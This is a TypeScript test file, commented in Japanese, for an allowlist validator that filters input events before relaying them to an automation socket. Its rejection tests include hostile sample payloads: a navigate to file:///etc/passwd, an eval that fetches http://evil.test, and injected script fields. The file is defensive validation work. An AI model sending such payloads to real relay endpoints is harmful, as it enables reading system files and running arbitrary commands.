import { describe, expect, it } from "vitest";
import { relayableInput } from "./relayable-input.js";

const parsed = (payload: unknown): unknown => {
  const relayed = relayableInput(JSON.stringify(payload));
  return relayed === undefined ? undefined : JSON.parse(relayed);
};

describe("中継してよい入力", () => {
  it("マウスの押下を通す", () => {
    expect(
      parsed({
        type: "input_mouse",
        eventType: "mousePressed",
        x: 10,
        y: 20,
        button: "left",
        clickCount: 1,
      }),
    ).toEqual({
      type: "input_mouse",
      eventType: "mousePressed",
      x: 10,
      y: 20,
      button: "left",
      clickCount: 1,
    });
  });

  it("ホイールを通す", () => {
    // スクロールは要素選択の前提であり、画面の外にある要素へ届くために要る。
    expect(
      parsed({ type: "input_mouse", eventType: "mouseWheel", x: 1, y: 2, deltaX: 0, deltaY: -120 }),
    ).toEqual({
      type: "input_mouse",
      eventType: "mouseWheel",
      x: 1,
      y: 2,
      deltaX: 0,
      deltaY: -120,
    });
  });

  it("キー入力と貼り付けを通す", () => {
    expect(parsed({ type: "input_keyboard", eventType: "char", text: "あ" })).toEqual({
      type: "input_keyboard",
      eventType: "char",
      text: "あ",
    });
  });

  it("タッチを通す", () => {
    expect(
      parsed({ type: "input_touch", eventType: "touchStart", touchPoints: [{ x: 1, y: 2 }] }),
    ).toEqual({ type: "input_touch", eventType: "touchStart", touchPoints: [{ x: 1, y: 2 }] });
  });
});

describe("中継しない入力", () => {
  it("列挙に無い type を落とす", () => {
    // **ここが本題である。** 素通しにすると、認証を通した client が実行基盤の
    // 配信ソケットへ任意の命令を送れる (ADR-0008)。
    expect(parsed({ type: "navigate", url: "file:///etc/passwd" })).toBeUndefined();
    expect(parsed({ type: "eval", expression: "fetch('http://evil.test')" })).toBeUndefined();
  });

  it.each([
    ["列挙に無いマウス種別", { type: "input_mouse", eventType: "mouseDoubleClicked", x: 1, y: 2 }],
    ["座標が無い", { type: "input_mouse", eventType: "mousePressed", y: 2 }],
    ["座標が数値でない", { type: "input_mouse", eventType: "mousePressed", x: "1", y: 2 }],
    ["座標が桁外れ", { type: "input_mouse", eventType: "mousePressed", x: 1e9, y: 2 }],
    ["NaN", { type: "input_mouse", eventType: "mousePressed", x: Number.NaN, y: 2 }],
    ["列挙に無いキー種別", { type: "input_keyboard", eventType: "keyPressed" }],
    ["タッチ点が配列でない", { type: "input_touch", eventType: "touchStart", touchPoints: {} }],
    [
      "タッチ点が多すぎる",
      {
        type: "input_touch",
        eventType: "touchStart",
        touchPoints: Array.from({ length: 11 }, () => ({ x: 1, y: 2 })),
      },
    ],
    [
      "タッチ点の座標が壊れている",
      {
        type: "input_touch",
        eventType: "touchStart",
        touchPoints: [{ x: 1 }],
      },
    ],
    ["配列", [1, 2]],
    ["null", null],
    ["文字列", "x"],
  ])("%s を落とす", (_label, payload) => {
    expect(parsed(payload)).toBeUndefined();
  });

  it("JSON でない文字列を落とす", () => {
    expect(relayableInput("{")).toBeUndefined();
  });

  it("列挙に無い項目を混ぜても通さない", () => {
    // **組み直して送る。** 元の文字列を返すと、列挙に無い項目がそのまま届く。
    expect(
      parsed({
        type: "input_mouse",
        eventType: "mousePressed",
        x: 1,
        y: 2,
        script: "alert(1)",
        url: "file:///etc/passwd",
      }),
    ).toEqual({ type: "input_mouse", eventType: "mousePressed", x: 1, y: 2 });
  });

  it("長すぎるテキストを落とす", () => {
    expect(parsed({ type: "input_keyboard", eventType: "char", text: "a".repeat(4097) })).toEqual({
      type: "input_keyboard",
      eventType: "char",
    });
  });
});
